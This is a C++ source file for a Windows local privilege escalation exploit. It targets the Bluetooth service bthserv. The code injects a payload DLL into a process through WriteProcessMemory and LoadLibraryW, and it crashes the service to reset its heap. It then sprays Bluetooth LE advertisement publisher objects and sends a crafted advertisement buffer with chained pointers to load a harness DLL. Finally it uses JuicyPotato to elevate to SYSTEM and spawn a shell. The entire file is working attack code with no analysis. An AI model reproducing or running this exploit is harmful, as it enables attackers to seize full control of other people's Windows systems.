#include <Windows.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <DbgHelp.h>
#include <bluetoothapis.h>

#include "..\shared\utils.h"
#include "..\shared\defines.h"

#include <fstream>
#include <string>

#include <wrl\client.h>
#include <wrl\wrappers\corewrappers.h>
#include <windows.foundation.h>
#include <windows.devices.bluetooth.advertisement.h>
#include <windows.storage.streams.h>

using namespace Microsoft::WRL;
using namespace Microsoft::WRL::Wrappers;
using namespace ABI::Windows::Foundation;
using namespace ABI::Windows::Devices::Bluetooth::Advertisement;
using namespace ABI::Windows::Storage::Streams;

#pragma comment(lib, "runtimeobject.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "bthprops.lib")

static std::wstring g_DeployedHarnessPath;
static bool g_PayloadLoaded;
static const void* g_HarnessPathReferenceAddr;
static const void* g_PointerToPointerToOneRef;
static ComPtr<IBluetoothLEAdvertisementPublisher> g_PublisherArray[0x1000];

bool CheckIfBluetoothRadioExists()
{
    Print("[*] Checking if Bluetooth radio exists.\n");
    {
        ScopedIndent();
        BLUETOOTH_FIND_RADIO_PARAMS params = { sizeof(BLUETOOTH_FIND_RADIO_PARAMS) };
        HANDLE hRadio = NULL;
        HANDLE hBthFindRadio = BluetoothFindFirstRadio(&params, &hRadio);
        CloseHandle(hRadio);
        if (!hBthFindRadio || !hRadio)
        {
            Print("[-] Bluetooth radio doesn't exist.\n");
            return false;
        }

        Print("[+] Success.\n");
        return true;

    }
}

bool GrantFileAccesses()
{
    Print("[*] Granting app packages access to the payload dll.\n");
    {
        ScopedIndent();
        if (!GrantGroupAccessToObject(PAYLOAD_DLL_NAME, L"ALL APPLICATION PACKAGES", SE_FILE_OBJECT, GENERIC_READ | GENERIC_EXECUTE))
        {
            return false;
        }
        
        Print("[+] Success.\n");
    }

    Print("[*] Granting everyone access to the JuicyPotato executable.\n");
    {
        ScopedIndent();
        if (!GrantGroupAccessToObject(JUICYPOTATO_EXE_NAME, L"Everyone", SE_FILE_OBJECT, GENERIC_READ | GENERIC_EXECUTE))
        {
            return false;
        }

        Print("[+] Success.\n");
    }

    return true;
}

bool GetHarnessAndPointerReferenceInExtModule(const wchar_t* moduleName, const wchar_t* harnessReference)
{

    Print("[*] Finding a reference string to harness in the external module.\n");
    {
        ScopedIndent();
        HMODULE extDllHandle = LoadLibrary(moduleName);
        if (!extDllHandle)
        {
            Print("[-] Unable to load the external DLL %ls\n", moduleName);
            return false;
        }

        MODULEINFO extDllInfo;
        if (!GetModuleInformation(GetCurrentProcess(), extDllHandle, &extDllInfo, sizeof(extDllInfo)))
        {
            Print("[-] Unable to get module information for %ls.\n", moduleName);
            return false;
        }

        const uint8_t* moduleBytes = reinterpret_cast<const uint8_t*>(extDllHandle);
        const size_t moduleSize = extDllInfo.SizeOfImage;
        const uint8_t* patternBytes = reinterpret_cast<const uint8_t*>(harnessReference);
        const size_t patternSize = (wcslen(harnessReference) + 1) * sizeof(wchar_t);
        const int64_t patternIndex = FindBytePatternIndex(moduleBytes, moduleSize, patternBytes, patternSize);
        if (patternIndex == -1)
        {
            Print("[-] Unable to find a reference string to the harness in external module.\n");
            return false;
        }

        g_HarnessPathReferenceAddr = moduleBytes + patternIndex;
        Print("[+] Success.\n");
    }

    Print("[*] Finding a chained pointer to a 8-bit 1 in the external module.\n");
    {
        ScopedIndent();
        HMODULE extDllHandle = LoadLibrary(moduleName);
        if (!extDllHandle)
        {
            Print("[-] Unable to load the external DLL %ls\n", moduleName);
            return false;
        }

        PIMAGE_NT_HEADERS64 ntHeader = ImageNtHeader(extDllHandle);
        WORD numSections = ntHeader->FileHeader.NumberOfSections;
        PIMAGE_SECTION_HEADER curSection = IMAGE_FIRST_SECTION(ntHeader);

        bool foundSection = false;
        bool foundPtr = false;
        for (WORD i = 0; i < numSections && !foundSection; i++)
        {
            if (!memcmp(curSection->Name, ".rdata", sizeof(".rdata")))
            {
                foundSection = true;
                uint64_t* sectionBegin = (uint64_t*)((uint8_t*)extDllHandle + curSection->VirtualAddress);
                uint64_t* sectionEnd = sectionBegin + curSection->SizeOfRawData / sizeof(uint64_t);
                for (uint64_t* currentPtr = sectionBegin; currentPtr != sectionEnd; ++currentPtr)
                {
                    uint64_t* secondPtr = (uint64_t*)*currentPtr;
                    if (secondPtr >= sectionBegin && secondPtr <= sectionEnd)
                    {
                        foundPtr = true;
                        for (uint32_t i = 1; i <= 5; ++i)
                        {
                            uint8_t ptrValue = *((uint8_t*)secondPtr + i * 4 + 2);
                            if (ptrValue != 0x01)
                            {
                                foundPtr = false;
                                break;
                            }
                        }

                        if (foundPtr)
                        {
                            g_PointerToPointerToOneRef = currentPtr - 2;
                            break;
                        }
                    }
                }
            }
            curSection++;
        }

        if (g_PointerToPointerToOneRef)
        {
            Print("[+] Success.\n");
        }
        else
        {
            Print("[-] Couldn't find a properly chained pointer in external module.\n");
            return false;
        }
    }
    return true;
}

bool LoadPayloadDllIntoProcess(const wchar_t* processName, const wchar_t* dllName)
{
    auto CheckIfPayloadAlreadyInProcess = [&]()
    {
        DWORD processID = FindProcessPID(processName);
        if (processID == -1)
        {
            return false;
        }

        HANDLE processHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processID);
        if (processHandle == 0)
        {
            return false;
        }

        HMODULE hMods[1024];
        DWORD cbNeeded = 0;
        if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded))
        {
            for (uint32_t i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
            {
                wchar_t moduleName[MAX_PATH];
                if (GetModuleFileNameEx(processHandle, hMods[i], moduleName, sizeof(moduleName) / sizeof(wchar_t)))
                {
                    if (wcsstr(moduleName, dllName))
                    {
                        return true;
                    }
                }
            }
        }

        return false;
    };

    WinEventWrapper payloadLoadWrapper(L"bthlpe_payloadloaded");

    Print("[*] Injecting payload DLL into %ls.\n", processName);
    {
        ScopedIndent();
        if (CheckIfPayloadAlreadyInProcess())
        {
            g_PayloadLoaded = true;
            Print("[+] Payload DLL is already injected.\n");
            return true;
        }

        wchar_t dllFullName[MAX_PATH];
        GetFullPathName(dllName, sizeof(dllFullName) / sizeof(wchar_t), dllFullName, NULL);
        bool success = ExecuteFnInRemoteProcess(processName, L"kernel32.dll", "LoadLibraryW", [&](HANDLE process, LPVOID address)
            {
                return WriteProcessMemory(process, address, dllFullName, (wcslen(dllFullName) + 1) * sizeof(wchar_t), NULL);
            });

        if (!success)
        {
            return false;
        }

        Print("[+] Success.\n");
    }

    Print("[*] Verifying that the payload DLL is injected.\n");
    {
        ScopedIndent();
        if (payloadLoadWrapper.Wait())
        {
            g_PayloadLoaded = true;
            Print("[+] Success.\n");
            return true;
        }
        else
        {
            Print("[-] Failed. Payload DLL didn't report back.\n");
            return false;
        }
    }
}

bool DeployHarness(const wchar_t* harnessDeployName)
{
    const wchar_t* harnessName = HARNESS_DLL_NAME;

    std::wstring harnessDeployNameStr = harnessDeployName;
    size_t directorySplitIndex = harnessDeployNameStr.find_last_of(L'\\');
    std::wstring harnessDeployDirectory = harnessDeployNameStr.substr(0, directorySplitIndex);
    std::wstring harnessDeployFilename = harnessDeployNameStr.substr(directorySplitIndex + 1);

    std::wstring harnessDeployDirectoryWithDrive = L"C:" + harnessDeployDirectory;
    g_DeployedHarnessPath = harnessDeployDirectoryWithDrive + L"\\" + harnessDeployFilename + L".dll";
    Print("[*] Deploying the harness DLL.\n");
    {
        ScopedIndent();
        if (!CreateDirectory(harnessDeployDirectoryWithDrive.c_str(), NULL))
        {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
            {
                Print("[-] Unable to create directory %ls. Error: 0x%X.\n", harnessDeployDirectoryWithDrive.c_str(), GetLastError());
                return false;
            }
        }

        if (!CopyFile(harnessName, g_DeployedHarnessPath.c_str(), false))
        {
            Print("[-] Unable to copy the harness DLL to %ls. Error: 0x%X.\n", g_DeployedHarnessPath.c_str(), GetLastError());
            return false;
        }

        Print("[+] Success.\n");
    }

    Print("[*] Writing Juicy Potato command line into harness.\n");
    {
        ScopedIndent();

        wchar_t juicyPotatoFullPath[MAX_PATH];
        GetFullPathName(JUICYPOTATO_EXE_NAME, MAX_PATH, juicyPotatoFullPath, NULL);

        std::wstring juicyPotatoCommandLine = L"";
        juicyPotatoCommandLine += juicyPotatoFullPath;
        juicyPotatoCommandLine += L" ";
        juicyPotatoCommandLine += JUICYPOTATO_ARGS;

        std::basic_fstream<uint8_t> harnessDstFile(g_DeployedHarnessPath, std::ios::binary | std::ios::in | std::ios::out);
        std::vector<uint8_t> harnessBytes((std::istreambuf_iterator<uint8_t>(harnessDstFile)), std::istreambuf_iterator<uint8_t>());
        const std::vector<uint8_t> juicyPotatoCommandLinePattern = JUICY_POTATO_COMMAND_LINE_PATTERN;
        size_t patternIndex = FindBytePatternIndex(harnessBytes.data(), harnessBytes.size(), juicyPotatoCommandLinePattern.data(), juicyPotatoCommandLinePattern.size());
        if (patternIndex == -1)
        {
            Print("[-] Couldn't find Juicy Potato command line pattern in the harness.\n");
            return false;
        }
        harnessDstFile.seekg(patternIndex, std::ios_base::beg);
        harnessDstFile.write((uint8_t*)juicyPotatoCommandLine.c_str(), juicyPotatoCommandLine.size() * sizeof(wchar_t));
        Print("[+] Success.\n");
    }
    

    return true;
}

bool DoStep1()
{
    Print("[ - Step 1 - ]\n");
    {
        ScopedIndent();

        if (!CheckIfBluetoothRadioExists())
        {
            return false;
        }

        if (!GrantFileAccesses())
        {
            return false;
        }

        if (!GetHarnessAndPointerReferenceInExtModule(HARNESS_REF_EXT_MODULE, HARNESS_DEPLOY_NAME))
        {
            return false;
        }

        if (!DeployHarness(HARNESS_DEPLOY_NAME))
        {
            return false;
        }

        if (!LoadPayloadDllIntoProcess(TARGET_PROCESS_NAME, PAYLOAD_DLL_NAME))
        {
            return false;
        }
    }

    return true;
}

bool TriggerPayloadThroughTargetProcess(const wchar_t* processName, const std::vector<uint8_t>& advData)
{
    WinEventWrapper eventWrapper(L"bthlpe_payloadsuccess");

    Print("[*] Triggering payload (size = %llu) through target process.\n", advData.size());
    {
        ScopedIndent();
        bool success = ExecuteFnInRemoteProcess(processName, L"bthlpe_payload.dll", "DeployPayload", [&](HANDLE process, LPVOID address)
            {
                size_t dataSize = advData.size();
                return WriteProcessMemory(process, address, &dataSize, sizeof(size_t), NULL) && WriteProcessMemory(process, (uint8_t*)address + sizeof(size_t), advData.data(), dataSize, NULL);
            });

        if (!success)
        {
            return false;
        }

        Print("[+] Success.\n");
    }

    Print("[*] Waiting for payload DLL.\n");
    {
        ScopedIndent();
        if (eventWrapper.Wait())
        {
            Print("[+] Success.\n");
            return true;
        }
        else
        {
            Print("[-] Payload execution failed.\n");
            return false;
        }
    }
}

bool DeployRCEPayloadAndWaitForHarness()
{
    WinEventWrapper loadEventWrapper(L"Global\\bthlpe_harnessloaded");

    Print("[*] Deploying RCE payload to bthserv\n");
    {
        ScopedIndent();
        const std::vector<uint8_t> emptySectionData = { 0x01, 0x00 };
        const std::vector<uint8_t> failSectionData = { 0x03, 0x13, 0x00, 0x00 };

        BinaryStream payloadSectionStream;
        payloadSectionStream.Write<uint8_t>(0x00);       // size filler
        payloadSectionStream.Write<uint8_t>(0x24);       // section type = custom

        // filler bytes
        for (uint8_t i = 0; i < 0x0B; ++i)
        {
            payloadSectionStream.Write<uint8_t>(0x00);
        }

        payloadSectionStream.Write(g_PointerToPointerToOneRef);
        payloadSectionStream.Write(g_HarnessPathReferenceAddr);
        payloadSectionStream.Write(GetFnAddress(L"kernel32.dll", "LoadLibraryW"));
        payloadSectionStream.Write(GetFnAddress(L"kernel32.dll", "LoadLibraryW"));

        // more filler bytes
        for (uint8_t i = 0; i < 0x2A; ++i)
        {
            payloadSectionStream.Write<uint8_t>(0x00);
        }

        payloadSectionStream.Write<uint16_t>(0x0506);   // to trigger the exception path at destruction of objects

        std::vector<uint8_t> payloadSectionData = payloadSectionStream.GetBuffer();
        payloadSectionData[0] = (uint8_t)(payloadSectionData.size() - 1);

        constexpr size_t k_NumPrefixSections = 9;
        constexpr size_t k_NumPostfixSections = 248;

        std::vector<uint8_t> rceData;

        for (size_t i = 0; i < k_NumPrefixSections; ++i)
        {
            rceData.insert(rceData.end(), emptySectionData.begin(), emptySectionData.end());
        }

        rceData.insert(rceData.end(), payloadSectionData.begin(), payloadSectionData.end());

        size_t prefixAndCustomDataSize = rceData.size();

        rceData.insert(rceData.end(), failSectionData.begin(), failSectionData.end());

        for (size_t i = 0; i < k_NumPostfixSections - 1; ++i)
        {
            rceData.insert(rceData.end(), emptySectionData.begin(), emptySectionData.end());
        }

        uint8_t paddingSize = ((uint8_t)prefixAndCustomDataSize - (uint8_t)rceData.size() - 2);
        std::vector<uint8_t> paddingSectionData(paddingSize + 2);
        paddingSectionData[0] = paddingSize;
        rceData.insert(rceData.end(), paddingSectionData.begin(), paddingSectionData.end());

        if (!TriggerPayloadThroughTargetProcess(TARGET_PROCESS_NAME, rceData))
        {
            return false;
        }
    }

    Print("[*] Triggering sprayed objects.\n");
    {
        ScopedIndent();
        for (uint32_t i = 0; i < 0x1000; ++i)
        {
            g_PublisherArray[i].Reset();
        }

        Print("[+] Success.\n");
    }

    Print("[*] Waiting for harness to load.\n");
    {
        ScopedIndent();
        if (loadEventWrapper.Wait())
        {
            Print("[+] Sucesss.\n");
            return true;
        }
        else
        {
            Print("[-] Harness loading failed.\n");
            return false;
        }
    }
}

bool CrashBthserv()
{
    Print("[+] Crashing bthserv to reset heap layout.\n");
    {
        ScopedIndent();
        const std::vector<uint8_t> emptySectionData = { 0x01, 0x00 };
        constexpr uint32_t k_SectionCount = 257;
        std::vector<uint8_t> crashAdvData;
        for (uint32_t i = 0; i < k_SectionCount; ++i)
        {
            crashAdvData.insert(crashAdvData.begin(), emptySectionData.begin(), emptySectionData.end());
        }

        if (!TriggerPayloadThroughTargetProcess(TARGET_PROCESS_NAME, crashAdvData))
        {
            return false;
        }

        constexpr uint32_t k_WaitMs = 3000;
        Print("[+] Waiting %ums.\n", k_WaitMs);
        {
            ScopedIndent();
            Sleep(k_WaitMs);
            Print("[+] Success.\n");
        }
    }

    return true;
}

bool TriggerRCEWithSprayingAndWaitForHarness()
{
    auto GenerateBthLEPublisher = []() -> ComPtr<IBluetoothLEAdvertisementPublisher>
    {
        ComPtr<IBluetoothLEAdvertisement> advertisement;
        if (FAILED(ActivateInstance(HStringReference(RuntimeClass_Windows_Devices_Bluetooth_Advertisement_BluetoothLEAdvertisement).Get(), &advertisement)))
        {
            return {};
        }

        ComPtr<IBluetoothLEAdvertisementPublisherFactory> publisherFactory;
        if (FAILED(GetActivationFactory(HStringReference(RuntimeClass_Windows_Devices_Bluetooth_Advertisement_BluetoothLEAdvertisementPublisher).Get(), &publisherFactory)))
        {
            return {};
        }

        ComPtr<IBluetoothLEAdvertisementPublisher> publisher;
        if (FAILED(publisherFactory->Create(advertisement.Get(), &publisher)))
        {
            return {};
        }

        return publisher;
    };

    auto SprayObjects = [&](uint32_t index, uint32_t count)
    {
        for (size_t i = 0; i < count; ++i)
        {
            ComPtr<IBluetoothLEAdvertisementPublisher> publisher = GenerateBthLEPublisher();
            if (!publisher.Get())
            {
                Print("[-] Unable to generate a BluetoothLEAdvertisementPublisher.\n");
                return false;
            }
            g_PublisherArray[i + index] = publisher;
            publisher->Start();
        }

        return true;
    };

    auto FreeObjects = [](uint32_t index, uint32_t count)
    {
        for (uint32_t i = index; i < index + count; ++i)
        {
            g_PublisherArray[i].Reset();
        }
    };

    WinEventWrapper harnessFinishedWrapper(L"Global\\bthlpe_harnessfinished");

    constexpr uint32_t k_RetryCount = 20;
    const uint32_t k_InitialSprayCount = 510;
    const uint32_t k_PostSprayCount = 110;
    const uint32_t k_FreeCount = 16;
    bool success = false;
    Print("[*] Triggering RCE with spraying.\n");
    for (uint32_t i = 0; i < k_RetryCount; ++i)
    {
        ScopedIndent();

        Print("[*] Attempt %u\n", i + 1);
        {
            Sleep(10000u);
            ScopedIndent();
            Print("[*] Spraying StateMachineEngine objects.\n");

            if (!SprayObjects(0, k_InitialSprayCount))
            {
                return false;
            }

            uint32_t freeOffset = k_InitialSprayCount - 60;
            uint32_t freeCount = 0;
            for (uint32_t i = 0; i < k_FreeCount; i += freeCount)
            {
                freeCount = i < (k_FreeCount / 2) ? 2 : 1;
                FreeObjects(freeOffset, freeCount);
                freeOffset -= freeCount * 30;
            }

            if (!SprayObjects(k_InitialSprayCount, k_PostSprayCount))
            {
                return false;
            }

            if (!DeployRCEPayloadAndWaitForHarness())
            {
                Sleep(2000u);
                continue;
            }

            if (!SprayObjects(k_InitialSprayCount + k_PostSprayCount, k_FreeCount))
            {
                return false;
            }

            Print("[*] Checking if harness executed.\n");
            {
                ScopedIndent();
                if (!harnessFinishedWrapper.Wait())
                {
                    Print("[-] Harness failed to execute.");
                    return false;
                }

                success = true;
                Print("[+] Success.\n");
            }

            break;
        }
    }

    if (!success)
    {
        Print("[-] Retry Count reached. Exiting.\n");
        return false;
    }

    FreeObjects(0, 0x1000);

    return true;
}

bool WaitForJuicyPotatoAndShell()
{
    WinEventWrapper jpFinishedWrapper(L"Global\\bthlpe_juicypotatofinished");
    constexpr uint32_t k_TimeoutMs = 10000u;

    Print("[+] Waiting for JuicyPotato impersonation pipe.\n");
    {
        ScopedIndent();

        LPCWSTR pipeName = JUICYPOTATO_NAMEDPIPE_NAME;
        HANDLE hImpersonationPipe = INVALID_HANDLE_VALUE;

        constexpr uint32_t k_RetryMs = 250u;
        for (uint32_t totalMs = 0; totalMs < k_TimeoutMs; totalMs += k_RetryMs)
        {
            if ((hImpersonationPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE)
            {
                break;
            }

            Sleep(k_RetryMs);
        }

        if (hImpersonationPipe == INVALID_HANDLE_VALUE)
        {
            Print("[-] Timeout reached.\n");
            return false;
        }

        int32_t sessionId = -1;
#if JUICYPOTATO_USE_NAMED_PIPE_CLIENT_FOR_SESSION_ID
        sessionId = GetCurrentSessionId();
#endif
        DWORD bytesWritten = 0;
        if (!WriteFile(hImpersonationPipe, &sessionId, sizeof(sessionId), &bytesWritten, FALSE))
        {
            Print("[-] Unable to write bytes to the pipe.\n");
            return false;
        }
        CloseHandle(hImpersonationPipe);

        Print("[+] Success.\n");
    }

    Print("[*] Waiting for JuicyPotato to elevate to SYSTEM and spawn the shell.\n");
    {
        ScopedIndent();
        if (jpFinishedWrapper.Wait(k_TimeoutMs))
        {
            Print("[+] Success.\n");
        }
        else
        {
            Print("[-] JuicyPotato loading failed.\n");
            return false;
        }
    }
    
    return true;
}

bool DoStep2()
{
    Print("\n[ - Step 2 - ]\n");
    {
        ScopedIndent();
        return CrashBthserv() && TriggerRCEWithSprayingAndWaitForHarness() && WaitForJuicyPotatoAndShell();
    }
}

void Cleanup()
{
    if (!g_DeployedHarnessPath.empty())
    {
        DeleteFile(g_DeployedHarnessPath.c_str());
    }

    if (g_PayloadLoaded)
    {
        ExecuteFnInRemoteProcess(TARGET_PROCESS_NAME, PAYLOAD_DLL_NAME, "Unload", [&](HANDLE process, LPVOID address)
            {
                return true;
            });
    }
}

int main()
{
    RoInitializeWrapper initialize(RO_INIT_MULTITHREADED);
    if (!DoStep1() || !DoStep2())
    {
        Print("[-] Exploit failed.\n");
    }
    else
    {
        Print("[+] Exploit succeeded. A system shell should have spawned.\n");
    }
    Cleanup();
    return 0;
}